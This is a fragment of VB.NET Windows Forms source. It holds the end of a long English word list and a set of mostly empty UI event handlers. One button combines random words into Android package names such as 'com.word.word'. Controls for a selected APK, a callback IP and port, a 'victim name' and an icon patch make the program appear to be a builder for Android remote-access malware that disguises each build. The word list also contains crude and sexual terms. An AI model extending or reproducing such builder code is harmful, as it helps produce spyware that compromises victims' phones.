"provinces", "provincial", "provision", "provisions", "proxy", "prozac", "ps", "psi", "psp", "pst", "psychiatry", "psychological", "psychology", "pt", "pts", "pty", "pub", "public", "publication", "publications", "publicity", "publicly", "publish", "published", "publisher", "publishers", "publishing", "pubmed", "pubs", "puerto", "pull", "pulled", "pulling", "pulse", "pump", "pumps", "punch", "punishment", "punk", "pupils", "puppy", "purchase", "purchased", "purchases", "purchasing", "pure", "purple", "purpose", "purposes", "purse", "pursuant", "pursue", "pursuit", "push", "pushed", "pushing", "pussy", "put", "puts", "putting", "puzzle", "puzzles", "pvc", "python", "q", "qatar", "qc", "qld", "qt", "qty", "quad", "qualification", "qualifications", "qualified", "qualify", "qualifying", "qualities", "quality", "quantitative", "quantities", "quantity", "quantum", "quarter", "quarterly", "quarters", "que", "quebec", "queen", "queens", "queensland", "queries", "query", "quest", "question", "questionnaire", "questions", "queue", "qui", "quick", "quickly", "quiet", "quilt", "quit", "quite", "quiz", "quizzes", "quotations", "quote", "quoted", "quotes", "r", "ra", "rabbit", "race", "races", "rachel", "racial", "racing", "rack", "racks", "radar", "radiation", "radical", "radio", "radios", "radius", "rage", "raid", "rail", "railroad", "railway", "rain", "rainbow", "raise", "raised", "raises", "raising", "raleigh", "rally", "ralph", "ram", "ran", "ranch", "rand", "random", "randy", "range", "rangers", "ranges", "ranging", "rank", "ranked", "ranking", "rankings", "ranks", "rap", "rape", "rapid", "rapidly", "rapids", "rare", "rarely", "rat", "rate", "rated", "rates", "rather", "rating", "ratings", "ratio", "rational", "ratios", "rats", "raw", "ray", "raymond", "rays", "rb", "rc", "rca", "rd", "re", "reach", "reached", "reaches", "reaching", "reaction", "reactions", "read", "reader", "readers", "readily", "reading", "readings", "reads", "ready", "real", "realistic", "reality", "realize", "realized", "really", "realm", "realtor", "realtors", "realty", "rear", "reason", "reasonable", "reasonably", "reasoning", "reasons", "rebate", "rebates", "rebecca", "rebel", "rebound", "rec", "recall", "receipt", "receive", "received", "receiver", "receivers", "receives", "receiving", "recent", "recently", "reception", "receptor", "receptors", "recipe", "recipes", "recipient", "recipients", "recognised", "recognition", "recognize", "recognized", "recommend", "recommendation", "recommendations", "recommended", "recommends", "reconstruction", "record", "recorded", "recorder", "recorders", "recording", "recordings", "records", "recover", "recovered", "recovery", "recreation", "recreational", "recruiting", "recruitment", "recycling", "red", "redeem", "redhead", "reduce", "reduced", "reduces", "reducing", "reduction", "reductions", "reed", "reef", "reel", "ref", "refer", "reference", "referenced", "references", "referral", "referrals", "referred", "referring", "refers", "refinance", "refine", "refined", "reflect", "reflected", "reflection", "reflections", "reflects", "reform", "reforms", "refresh", "refrigerator", "refugees", "refund", "refurbished", "refuse", "refused", "reg", "regard", "regarded", "regarding", "regardless", "regards", "reggae", "regime", "region", "regional", "regions", "register", "registered", "registrar", "registration", "registry", "regression", "regular", "regularly", "regulated", "regulation", "regulations", "regulatory", "rehab", "rehabilitation", "reid", "reject", "rejected", "rel", "relate", "related", "relates", "relating", "relation", "relations", "relationship", "relationships", "relative", "relatively", "relatives", "relax", "relaxation", "relay", "release", "released", "releases", "relevance", "relevant", "reliability", "reliable", "reliance", "relief", "religion", "religions", "religious", "reload", "relocation", "rely", "relying", "remain", "remainder", "remained", "remaining", "remains", "remark", "remarkable", "remarks", "remedies", "remedy", "remember", "remembered", "remind", "reminder", "remix", "remote", "removable", "removal", "remove", "removed", "removing", "renaissance", "render", "rendered", "rendering", "renew", "renewable", "renewal", "reno", "rent", "rental", "rentals", "rentcom", "rep", "repair", "repairs", "repeat", "repeated", "replace", "replaced", "replacement", "replacing", "replica", "replication", "replied", "replies", "reply", "report", "reported", "reporter", "reporters", "reporting", "reports", "repository", "represent", "representation", "representations", "representative", "representatives", "represented", "representing", "represents", "reprint", "reprints", "reproduce", "reproduced", "reproduction", "reproductive", "republic", "republican", "republicans", "reputation", "request", "requested", "requesting", "requests", "require", "required", "requirement", "requirements", "requires", "requiring", "res", "rescue", "research", "researcher", "researchers", "reseller", "reservation", "reservations", "reserve", "reserved", "reserves", "reservoir", "reset", "residence", "resident", "residential", "residents", "resist", "resistance", "resistant", "resolution", "resolutions", "resolve", "resolved", "resort", "resorts", "resource", "resources", "respect", "respected", "respective", "respectively", "respiratory", "respond", "responded", "respondent", "respondents", "responding", "response", "responses", "responsibilities", "responsibility", "responsible", "rest", "restaurant", "restaurants", "restoration", "restore", "restored", "restrict", "restricted", "restriction", "restrictions", "restructuring", "result", "resulted", "resulting", "results", "resume", "resumes", "retail", "retailer", "retailers", "retain", "retained", "retention", "retired", "retirement", "retreat", "retrieval", "retrieve", "retrieved", "retro", "return", "returned", "returning", "returns", "reunion", "reuters", "rev", "reveal", "revealed", "reveals", "revelation", "revenge", "revenue", "revenues", "reverse", "review", "reviewed", "reviewer", "reviewing", "reviews", "revised", "revision", "revisions", "revolution", "revolutionary", "reward", "rewards", "reynolds", "rf", "rfc", "rg", "rh", "rhode", "rhythm", "ri", "ribbon", "rica", "rice", "rich", "richard", "richards", "richardson", "richmond", "rick", "rico", "rid", "ride", "rider", "riders", "rides", "ridge", "riding", "right", "rights", "rim", "ring", "rings", "ringtone", "ringtones", "rio", "rip", "ripe", "rise", "rising", "risk", "risks", "river", "rivers", "riverside", "rj", "rl", "rm", "rn", "rna", "ro", "road", "roads", "rob", "robert", "roberts", "robertson", "robin", "robinson", "robot", "robots", "robust", "rochester", "rock", "rocket", "rocks", "rocky", "rod", "roger", "rogers", "roland", "role", "roles", "roll", "rolled", "roller", "rolling", "rolls", "rom", "roman", "romance", "romania", "romantic", "rome", "ron", "ronald", "roof", "room", "roommate", "roommates", "rooms", "root", "roots", "rope", "rosa", "rose", "roses", "ross", "roster", "rotary", "rotation", "rouge", "rough", "roughly", "roulette", "round", "rounds", "route", "router", "routers", "routes", "routine", "routines", "routing", "rover", "row", "rows", "roy", "royal", "royalty", "rp", "rpg", "rpm", "rr", "rrp", "rs", "rss", "rt", "ru", "rubber", "ruby", "rug", "rugby", "rugs", "rule", "ruled", "rules", "ruling", "run", "runner", "running", "runs", "runtime", "rural", "rush", "russell", "russia", "russian", "ruth", "rv", "rw", "rwanda", "rx", "ryan", "s", "sa", "sacramento", "sacred", "sacrifice", "sad", "saddam", "safari", "safe", "safely", "safer", "safety", "sage", "sagem", "said", "sail", "sailing", "saint", "saints", "sake", "salad", "salaries", "salary", "sale", "salem", "sales", "sally", "salmon", "salon", "salt", "salvador", "salvation", "sam", "samba", "same", "samoa", "sample", "samples", "sampling", "samsung", "samuel", "san", "sand", "sandra", "sandwich", "sandy", "sans", "santa", "sanyo", "sao", "sap", "sapphire", "sara", "sarah", "sas", "saskatchewan", "sat", "satellite", "satin", "satisfaction", "satisfactory", "satisfied", "satisfy", "saturday", "saturn", "sauce", "saudi", "savage", "savannah", "save", "saved", "saver", "saves", "saving", "savings", "saw", "say", "saying", "says", "sb", "sbjct", "sc", "scale", "scales", "scan", "scanned", "scanner", "scanners", "scanning", "scary", "scenario", "scenarios", "scene", "scenes", "scenic", "schedule", "scheduled", "schedules", "scheduling", "schema", "scheme", "schemes", "scholar", "scholars", "scholarship", "scholarships", "school", "schools", "sci", "science", "sciences", "scientific", "scientist", "scientists", "scoop", "scope", "score", "scored", "scores", "scoring", "scotia", "scotland", "scott", "scottish", "scout", "scratch", "screen", "screening", "screens", "screensaver", "screensavers", "screenshot", "screenshots", "screw", "script", "scripting", "scripts", "scroll", "scsi", "scuba", "sculpture", "sd", "se", "sea", "seafood", "seal", "sealed", "sean", "search", "searchcom", "searched", "searches", "searching", "seas", "season", "seasonal", "seasons", "seat", "seating", "seats", "seattle", "sec", "second", "secondary", "seconds", "secret", "secretariat", "secretary", "secrets", "section", "sections", "sector", "sectors", "secure", "secured", "securely", "securities", "security", "see", "seed", "seeds", "seeing", "seek", "seeker", "seekers", "seeking", "seeks", "seem", "seemed", "seems", "seen", "sees", "sega", "segment", "segments", "select", "selected", "selecting", "selection", "selections", "selective", "self", "sell", "seller", "sellers", "selling", "sells", "semester", "semi", "semiconductor", "seminar", "seminars", "sen", "senate", "senator", "senators", "send", "sender", "sending", "sends", "senegal", "senior", "seniors", "sense", "sensitive", "sensitivity", "sensor", "sensors", "sent", "sentence", "sentences", "seo", "sep", "separate", "separated", "separately", "separation", "sept", "september", "seq", "sequence", "sequences", "ser", "serbia", "serial", "series", "serious", "seriously", "serum", "serve", "served", "server", "servers", "serves", "service", "services", "serving", "session", "sessions", "set", "sets", "setting", "settings", "settle", "settled", "settlement", "setup", "seven", "seventh", "several", "severe", "sewing", "sex", "sexcam", "sexo", "sexual", "sexuality", "sexually", "sexy", "sf", "sg", "sh", "shade", "shades", "shadow", "shadows", "shaft", "shake", "shakespeare", "shakira", "shall", "shame", "shanghai", "shannon", "shape", "shaped", "shapes", "share", "shared", "shareholders", "shares", "shareware", "sharing", "shark", "sharon", "sharp", "shaved", "shaw", "she", "shed", "sheep", "sheer", "sheet", "sheets", "sheffield", "shelf", "shell", "shelter", "shemale", "shemales", "shepherd", "sheriff", "sherman", "shield", "shift", "shine", "ship", "shipment", "shipments", "shipped", "shipping", "ships", "shirt", "shirts", "shit", "shock", "shoe", "shoes", "shoot", "shooting", "shop", "shopper", "shoppercom", "shoppers", "shopping", "shoppingcom", "shops", "shopzilla", "shore", "short", "shortcuts", "shorter", "shortly", "shorts", "shot", "shots", "should", "shoulder", "show", "showcase", "showed", "shower", "showers", "showing", "shown", "shows", "showtimes", "shut", "shuttle", "si", "sic", "sick", "side", "sides", "sie", "siemens", "sierra", "sig", "sight", "sigma", "sign", "signal", "signals", "signature", "signatures", "signed", "significance", "significant", "significantly", "signing", "signs", "signup", "silence", "silent", "silicon", "silk", "silly", "silver", "sim", "similar", "similarly", "simon", "simple", "simplified", "simply", "simpson", "simpsons", "sims", "simulation", "simulations", "simultaneously", "sin", "since", "sing", "singapore", "singer", "singh", "singing", "single", "singles", "sink", "sip", "sir", "sister", "sisters", "sit", "site", "sitemap", "sites", "sitting", "situated", "situation", "situations", "six", "sixth", "size", "sized", "sizes", "sk", "skating", "ski", "skiing", "skill", "skilled", "skills", "skin", "skins", "skip", "skirt", "skirts", "sku", "sky", "skype", "sl", "slave", "sleep", "sleeping", "sleeps", "sleeve", "slide", "slides", "slideshow", "slight", "slightly", "slim", "slip", "slope", "slot", "slots", "slovak", "slovakia", "slovenia", "slow", "slowly", "slut", "sluts", "sm", "small", "smaller", "smart", "smell", "smile", "smilies", "smith", "smithsonian", "smoke", "smoking", "smooth", "sms", "smtp", "sn", "snake", "snap", "snapshot", "snow", "snowboard", "so", "soa", "soap", "soc", "soccer", "social", "societies", "society", "sociology", "socket", "socks", "sodium", "sofa", "soft", "softball", "software", "soil", "sol", "solar", "solaris", "sold", "soldier", "soldiers", "sole", "solely", "solid", "solo", "solomon", "solution", "solutions", "solve", "solved", "solving", "soma", "somalia", "some", "somebody", "somehow", "someone", "somerset", "something", "sometimes", "somewhat", "somewhere", "son", "song", "songs", "sonic", "sons", "sony", "soon", "soonest", "sophisticated", "sorry", "sort", "sorted", "sorts", "sought", "soul", "souls", "sound", "sounds", "soundtrack", "soup", "source", "sources", "south", "southampton", "southeast", "southern", "southwest", "soviet", "sox", "sp", "spa", "space", "spaces", "spain", "spam", "span", "spanish", "spank", "spanking", "sparc", "spare", "spas", "spatial", "speak", "speaker", "speakers", "speaking", "speaks", "spears", "spec", "special", "specialist", "specialists", "specialized", "specializing", "specially", "specials", "specialties", "specialty", "species", "specific", "specifically", "specification", "specifications", "specifics", "specified", "specifies", "specify", "specs", "spectacular", "spectrum", "speech", "speeches", "speed", "speeds", "spell", "spelling", "spencer", "spend", "spending", "spent", "sperm", "sphere", "spice", "spider", "spies", "spin", "spine", "spirit", "spirits", "spiritual", "spirituality", "split", "spoke", "spoken", "spokesman", "sponsor", "sponsored", "sponsors", "sponsorship", "sport", "sporting", "sports", "spot", "spotlight", "spots", "spouse", "spray", "spread", "spreading", "spring", "springer", "springfield", "springs", "sprint", "spy", "spyware", "sq", "sql", "squad", "square", "squirt", "squirting", "sr", "src", "sri", "ss", "ssl", "st", "stability", "stable", "stack", "stadium", "staff", "staffing", "stage", "stages", "stainless", "stakeholders", "stamp", "stamps", "stan", "stand", "standard", "standards", "standing", "standings", "stands", "stanford", "stanley", "star", "starring", "stars", "starsmerchant", "start", "started", "starter", "starting", "starts", "startup", "stat", "state", "stated", "statement", "statements", "states", "statewide", "static", "stating", "station", "stationery", "stations", "statistical", "statistics", "stats", "status", "statute", "statutes", "statutory", "stay", "stayed", "staying", "stays", "std", "ste", "steady", "steal", "steam", "steel", "steering", "stem", "step", "stephanie", "stephen", "steps", "stereo", "sterling", "steve", "steven", "stevens", "stewart", "stick", "sticker", "stickers", "sticks", "sticky", "still", "stock", "stockholm", "stockings", "stocks", "stolen", "stomach", "stone", "stones", "stood", "stop", "stopped", "stopping", "stops", "storage", "store", "stored", "stores", "stories", "storm", "story", "str", "straight", "strain", "strand", "strange", "stranger", "strap", "strategic", "strategies", "strategy", "stream", "streaming", "streams", "street", "streets", "strength", "strengthen", "strengthening", "strengths", "stress", "stretch", "strict", "strictly", "strike", "strikes", "striking", "string", "strings", "strip", "stripes", "strips", "stroke", "strong", "stronger", "strongly", "struck", "struct", "structural", "structure", "structured", "structures", "struggle", "stuart", "stuck", "stud", "student", "students", "studied", "studies", "studio", "studios", "study", "studying", "stuff", "stuffed", "stunning", "stupid", "style", "styles", "stylish", "stylus", "su", "sub", "subaru", "subcommittee", "subdivision", "subject", "subjects", "sublime", "sublimedirectory", "submission", "submissions", "submit", "submitted", "submitting", "subscribe", "subscriber", "subscribers", "subscription", "subscriptions", "subsection", "subsequent", "subsequently", "subsidiaries", "subsidiary", "substance", "substances", "substantial", "substantially", "substitute", "subtle", "suburban", "succeed", "success", "successful", "successfully", "such", "suck", "sucking", "sucks", "sudan", "sudden", "suddenly", "sue", "suffer", "suffered", "suffering", "sufficient", "sufficiently", "sugar", "suggest", "suggested", "suggesting", "suggestion", "suggestions", "suggests", "suicide", "suit", "suitable", "suite", "suited", "suites", "suits", "sullivan", "sum", "summaries", "summary", "summer", "summit", "sun", "sunday", "sunglasses", "sunny", "sunrise", "sunset", "sunshine", "super", "superb", "superintendent", "superior", "supervision", "supervisor", "supervisors", "supplement", "supplemental", "supplements", "supplied", "supplier", "suppliers", "supplies", "supply", "support", "supported", "supporters", "supporting", "supports", "suppose", "supposed", "supreme", "sur", "sure", "surely", "surf", "surface", "surfaces", "surfing", "surge", "surgeon", "surgeons", "surgery", "surgical", "surname", "surplus", "surprise", "surprised", "surprising", "surrey", "surround", "surrounded", "surrounding", "surveillance", "survey", "surveys", "survival", "survive", "survivor", "survivors", "susan", "suse", "suspect", "suspected", "suspended", "suspension", "sussex", "sustainability", "sustainable", "sustained", "suzuki", "sv", "sw", "swap", "sweden", "swedish", "sweet", "swift", "swim", "swimming", "swing", "swingers", "swiss", "switch", "switched", "switches", "switching", "switzerland", "sword", "sydney", "symantec", "symbol", "symbols", "sympathy", "symphony", "symposium", "symptoms", "sync", "syndicate", "syndication", "syndrome", "synopsis", "syntax", "synthesis", "synthetic", "syracuse", "syria", "sys", "system", "systematic", "systems", "t", "ta", "tab", "table", "tables", "tablet", "tablets", "tabs", "tackle", "tactics", "tag", "tagged", "tags", "tahoe", "tail", "taiwan", "take", "taken", "takes", "taking", "tale", "talent", "talented", "tales", "talk", "talked", "talking", "talks", "tall", "tamil", "tampa", "tan", "tank", "tanks", "tanzania", "tap", "tape", "tapes", "tar", "target", "targeted", "targets", "tariff", "task", "tasks", "taste", "tattoo", "taught", "tax", "taxation", "taxes", "taxi", "taylor", "tb", "tba", "tc", "tcp", "td", "te", "tea", "teach", "teacher", "teachers", "teaches", "teaching", "team", "teams", "tear", "tears", "tech", "technical", "technician", "technique", "techniques", "techno", "technological", "technologies", "technology", "techrepublic", "ted", "teddy", "tee", "teen", "teenage", "teens", "teeth", "tel", "telecharger", "telecom", "telecommunications", "telephone", "telephony", "telescope", "television", "televisions", "tell", "telling", "tells", "temp", "temperature", "temperatures", "template", "templates", "temple", "temporal", "temporarily", "temporary", "ten", "tenant", "tend", "tender", "tennessee", "tennis", "tension", "tent", "term", "terminal", "terminals", "termination", "terminology", "terms", "terrace", "terrain", "terrible", "territories", "territory", "terror", "terrorism", "terrorist", "terrorists", "terry", "test", "testament", "tested", "testimonials", "testimony", "testing", "tests", "tex", "texas", "text", "textbook", "textbooks", "textile", "textiles", "texts", "texture", "tf", "tft", "tgp", "th", "thai", "thailand", "than", "thank", "thanks", "thanksgiving", "that", "thats", "the", "theater", "theaters", "theatre", "thee", "theft", "thehun", "their", "them", "theme", "themes", "themselves", "then", "theology", "theorem", "theoretical", "theories", "theory", "therapeutic", "therapist", "therapy", "there", "thereafter", "thereby", "therefore", "thereof", "thermal", "thesaurus", "these", "thesis", "they", "thick", "thickness", "thin", "thing", "things", "think", "thinking", "thinkpad", "thinks", "third", "thirty", "this", "thomas", "thompson", "thomson", "thong", "thongs", "thorough", "thoroughly", "those", "thou", "though", "thought", "thoughts", "thousand", "thousands", "thread", "threaded", "threads", "threat", "threatened", "threatening", "threats", "three", "threesome", "threshold", "thriller", "throat", "through", "throughout", "throw", "throwing", "thrown", "throws", "thru", "thu", "thumb", "thumbnail", "thumbnails", "thumbs", "thumbzilla", "thunder", "thursday", "thus", "thy", "ti", "ticket", "tickets", "tide", "tie", "tied", "tier", "ties", "tiffany", "tiger", "tigers", "tight", "til", "tile", "tiles", "till", "tim", "timber", "time", "timeline", "timely", "timer", "times", "timing", "timothy", "tin", "tiny", "tion", "tions", "tip", "tips", "tire", "tired", "tires", "tissue", "tit", "titanium", "titans", "title", "titled", "titles", "tits", "titten", "tm", "tmp", "tn", "to", "tobacco", "tobago", "today", "todd", "toddler", "toe", "together", "toilet", "token", "tokyo", "told", "tolerance", "toll", "tom", "tomato", "tomatoes", "tommy", "tomorrow", "ton", "tone", "toner", "tones", "tongue", "tonight", "tons", "tony", "too", "took", "tool", "toolbar", "toolbox", "toolkit", "tools", "tooth", "top", "topic", "topics", "topless", "tops", "toronto", "torture", "toshiba", "total", "totally", "totals", "touch", "touched", "tough", "tour", "touring", "tourism", "tourist", "tournament", "tournaments", "tours", "toward", "towards", "tower", "towers", "town", "towns", "township", "toxic", "toy", "toyota", "toys", "tp", "tr", "trace", "track", "trackback", "trackbacks", "tracked", "tracker", "tracking", "tracks", "tract", "tractor", "tracy", "trade", "trademark", "trademarks", "trader", "trades", "trading", "tradition", "traditional", "traditions", "traffic", "tragedy", "trail", "trailer", "trailers", "trails", "train", "trained", "trainer", "trainers", "training", "trains", "tramadol", "trance", "tranny", "trans", "transaction", "transactions", "transcript", "transcription", "transcripts", "transexual", "transexuales", "transfer", "transferred", "transfers", "transform", "transformation", "transit", "transition", "translate", "translated", "translation", "translations", "translator", "transmission", "transmit", "transmitted", "transparency", "transparent", "transport", "transportation", "transsexual", "trap", "trash", "trauma", "travel", "traveler", "travelers", "traveling", "traveller", "travelling", "travels", "travesti", "travis", "tray", "treasure", "treasurer", "treasures", "treasury", "treat", "treated", "treating", "treatment", "treatments", "treaty", "tree", "trees", "trek", "trembl", "tremendous", "trend", "trends", "treo", "tri", "trial", "trials", "triangle", "tribal", "tribe", "tribes", "tribunal", "tribune", "tribute", "trick", "tricks", "tried", "tries", "trigger", "trim", "trinidad", "trinity", "trio", "trip", "tripadvisor", "triple", "trips", "triumph", "trivia", "troops", "tropical", "trouble", "troubleshooting", "trout", "troy", "truck", "trucks", "true", "truly", "trunk", "trust", "trusted", "trustee", "trustees", "trusts", "truth", "try", "trying", "ts", "tsunami", "tt", "tu", "tub", "tube", "tubes", "tucson", "tue", "tuesday", "tuition", "tulsa", "tumor", "tune", "tuner", "tunes", "tuning", "tunisia", "tunnel", "turbo", "turkey", "turkish", "turn", "turned", "turner", "turning", "turns", "turtle", "tutorial", "tutorials", "tv", "tvcom", "tvs", "twelve", "twenty", "twice", "twiki", "twin", "twinks", "twins", "twist", "twisted", "two", "tx", "ty", "tyler", "type", "types", "typical", "typically", "typing", "u", "uc", "uganda", "ugly", "uh", "ui", "uk", "ukraine", "ul", "ultimate", "ultimately", "ultra", "ultram", "um", "un", "una", "unable", "unauthorized", "unavailable", "uncertainty", "uncle", "und", "undefined", "under", "undergraduate", "underground", "underlying", "understand", "understanding", "understood", "undertake", "undertaken", "underwear", "undo", "une", "unemployment", "unexpected", "unfortunately", "uni", "unified", "uniform", "union", "unions", "uniprotkb", "unique", "unit", "united", "units", "unity", "univ", "universal", "universe", "universities", "university", "unix", "unknown", "unless", "unlike", "unlikely", "unlimited", "unlock", "unnecessary", "unsigned", "unsubscribe", "until", "untitled", "unto", "unusual", "unwrap", "up", "upc", "upcoming", "update", "updated", "updates", "updating", "upgrade", "upgrades", "upgrading", "upload", "uploaded", "upon", "upper", "ups", "upset", "upskirt", "upskirts", "ur", "urban", "urge", "urgent", "uri", "url", "urls", "uruguay", "urw", "us", "usa", "usage", "usb", "usc", "usd", "usda", "use", "used", "useful", "user", "username", "users", "uses", "usgs", "using", "usps", "usr", "usual", "usually", "ut", "utah", "utc", "utilities", "utility", "utilization", "utilize", "utils", "uv", "uw", "uzbekistan", "v", "va", "vacancies", "vacation", "vacations", "vaccine", "vacuum", "vagina", "val", "valentine", "valid", "validation", "validity", "valium", "valley", "valuable", "valuation", "value", "valued", "values", "valve", "valves", "vampire", "van", "vancouver", "vanilla", "var", "variable", "variables", "variance", "variation", "variations", "varied", "varies", "variety", "various", "vary", "varying", "vast", "vat", "vatican", "vault", "vb", "vbulletin", "vc", "vcr", "ve", "vector", "vegas", "vegetable", "vegetables", "vegetarian", "vegetation", "vehicle", "vehicles", "velocity", "velvet", "vendor", "vendors", "venezuela", "venice", "venture", "ventures", "venue", "venues", "ver", "verbal", "verde", "verification", "verified", "verify", "verizon", "vermont", "vernon", "verse", "version", "versions", "versus", "vertex", "vertical", "very", "verzeichnis", "vessel", "vessels", "veteran", "veterans", "veterinary", "vg", "vhs", "vi", "via", "viagra", "vibrator", "vibrators", "vic", "vice", "victim", "victims", "victor", "victoria", "victorian", "victory", "vid", "video", "videos", "vids", "vienna", "vietnam", "vietnamese", "view", "viewed", "viewer", "viewers", "viewing", "viewpicture", "views", "vii", "viii", "viking", "villa", "village", "villages", "villas", "vincent", "vintage", "vinyl", "violation", "violations", "violence", "violent", "violin", "vip", "viral", "virgin", "virginia", "virtual", "virtually", "virtue", "virus", "viruses", "visa", "visibility", "visible", "vision", "visit", "visited", "visiting", "visitor", "visitors", "visits", "vista", "visual", "vital", "vitamin", "vitamins", "vocabulary", "vocal", "vocals", "vocational", "voice", "voices", "void", "voip", "vol", "volkswagen", "volleyball", "volt", "voltage", "volume", "volumes", "voluntary", "volunteer", "volunteers", "volvo", "von", "vote", "voted", "voters", "votes", "voting", "voyeur", "voyeurweb", "voyuer", "vp", "vpn", "vs", "vsnet", "vt", "vulnerability", "vulnerable", "w", "wa", "wage", "wages", "wagner", "wagon", "wait", "waiting", "waiver", "wake", "wal", "wales", "walk", "walked", "walker", "walking", "walks", "wall", "wallace", "wallet", "wallpaper", "wallpapers", "walls", "walnut", "walt", "walter", "wan", "wang", "wanna", "want", "wanted", "wanting", "wants", "war", "warcraft", "ward", "ware", "warehouse", "warm", "warming", "warned", "warner", "warning", "warnings", "warrant", "warranties", "warranty", "warren", "warrior", "warriors", "wars", "was", "wash", "washer", "washing", "washington", "waste", "watch", "watched", "watches", "watching", "water", "waterproof", "waters", "watershed", "watson", "watt", "watts", "wav", "wave", "waves", "wax", "way", "wayne", "ways", "wb", "wc", "we", "weak", "wealth", "weapon", "weapons", "wear", "wearing", "weather", "web", "webcam", "webcams", "webcast", "weblog", "weblogs", "webmaster", "webmasters", "webpage", "webshots", "website", "websites", "webster", "wed", "wedding", "weddings", "wednesday", "weed", "week", "weekend", "weekends", "weekly", "weeks", "weight", "weighted", "weights", "weird", "welcome", "welding", "welfare", "well", "wellington", "wellness", "wells", "welsh", "wendy", "went", "were", "wesley", "west", "western", "westminster", "wet", "whale", "what", "whatever", "whats", "wheat", "wheel", "wheels", "when", "whenever", "where", "whereas", "wherever", "whether", "which", "while", "whilst", "white", "who", "whole", "wholesale", "whom", "whore", "whose", "why", "wi", "wichita", "wicked", "wide", "widely", "wider", "widescreen", "widespread", "width", "wife", "wifi", "wiki", "wikipedia", "wild", "wilderness", "wildlife", "wiley", "will", "william", "williams", "willing", "willow", "wilson", "win", "wind", "window", "windows", "winds", "windsor", "wine", "wines", "wing", "wings", "winner", "winners", "winning", "wins", "winston", "winter", "wire", "wired", "wireless", "wires", "wiring", "wisconsin", "wisdom", "wise", "wish", "wishes", "wishlist", "wit", "witch", "with", "withdrawal", "within", "without", "witness", "witnesses", "wives", "wizard", "wm", "wma", "wn", "wolf", "woman", "women", "womens", "won", "wonder", "wonderful", "wondering", "wood", "wooden", "woods", "wool", "worcester", "word", "wordpress", "words", "work", "worked", "worker", "workers", "workflow", "workforce", "working", "workout", "workplace", "works", "workshop", "workshops", "workstation", "world", "worldcat", "worlds", "worldsex", "worldwide", "worm", "worn", "worried", "worry", "worse", "worship", "worst", "worth", "worthy", "would", "wound", "wow", "wp", "wr", "wrap", "wrapped", "wrapping", "wrestling", "wright", "wrist", "write", "writer", "writers", "writes", "writing", "writings", "written", "wrong", "wrote", "ws", "wt", "wto", "wu", "wv", "ww", "www", "wx", "wy", "wyoming", "x", "xanax", "xbox", "xerox", "xhtml", "xi", "xl", "xml", "xnxx", "xp", "xx", "xxx", "y", "ya", "yacht", "yahoo", "yale", "yamaha", "yang", "yard", "yards", "yarn", "ye", "yea", "yeah", "year", "yearly", "years", "yeast", "yellow", "yemen", "yen", "yes", "yesterday", "yet", "yield", "yields", "yn", "yo", "yoga", "york", "yorkshire", "you", "young", "younger", "your", "yours", "yourself", "youth", "yr", "yrs", "yu", "yugoslavia", "yukon", "z", "za", "zambia", "zdnet", "zealand", "zen", "zero", "zimbabwe", "zinc", "zip", "zoloft", "zone", "zones", "zoning", "zoo", "zoom", "zoophilia", "zope", "zshops", "zu", "zum", "zus"}
    '   Private randend As String() = New String() {}
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        TextPackage.Text = "com" + "." + randmid(rnd.Next(0, randmid.Length)) + "." + randmid(rnd.Next(0, randmid.Length))
    End Sub



    Private Sub SelectedApk_Click_1(sender As Object, e As EventArgs) Handles SelectedApk.Click

    End Sub

    Private Sub DrakeUIAvatar1_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub DrakeUIAvatar2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs)


    End Sub

    Private Sub DrakeUITabControlMenu1_DrawItem(sender As Object, e As DrawItemEventArgs) Handles DrakeUITabControlMenu1.DrawItem
        Dim g = e.Graphics
        Dim Text = Me.DrakeUITabControlMenu1.TabPages(e.Index).Text
        Dim sizeText = g.MeasureString(Text, Me.DrakeUITabControlMenu1.Font)
        Dim x = e.Bounds.Left + 3
        Dim y = e.Bounds.Top + (e.Bounds.Height - sizeText.Height) / 2
        g.DrawString(Text, Me.DrakeUITabControlMenu1.Font, Brushes.Black, x, y)
        Dim CurrentTab As TabPage = DrakeUITabControlMenu1.TabPages(e.Index)
        Dim ItemRect As Rectangle = DrakeUITabControlMenu1.GetTabRect(e.Index)
        Dim FillBrush As New SolidBrush(Color.FromArgb(10, 10, 10))
        Dim TextBrush As New SolidBrush(Color.White)
        Dim sf As New StringFormat
        sf.Alignment = StringAlignment.Center
        sf.LineAlignment = StringAlignment.Center
        If CBool(e.State And DrawItemState.Selected) Then
            FillBrush.Color = Color.FromArgb(30, 30, 30)
            TextBrush.Color = Color.White
            ItemRect.Inflate(2, 2)
        End If
        e.Graphics.FillRectangle(FillBrush, ItemRect)
        e.Graphics.DrawString(CurrentTab.Text, e.Font, TextBrush, RectangleF.op_Implicit(ItemRect), sf)
        e.Graphics.ResetTransform()
        FillBrush.Dispose()
        TextBrush.Dispose()
    End Sub

    Private Sub Guna2Panel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2GradientPanel1_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel1.Paint

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click

    End Sub

    Private Sub CheckIconPatch_Load(sender As Object, e As EventArgs) Handles CheckIconPatch.Load

    End Sub

    Private Sub TextIP_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel1_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel1.Click

    End Sub

    Private Sub Guna2HtmlLabel2_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel2.Click

    End Sub

    Private Sub Guna2Panel3_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextNameVictim.TextChanged

    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox1.CheckedChanged

    End Sub

    Private Sub Guna2GradientPanel6_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel6.Paint

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        DGV0.Rows.Add(TextIP.Text & ":" & po.Text)
    End Sub

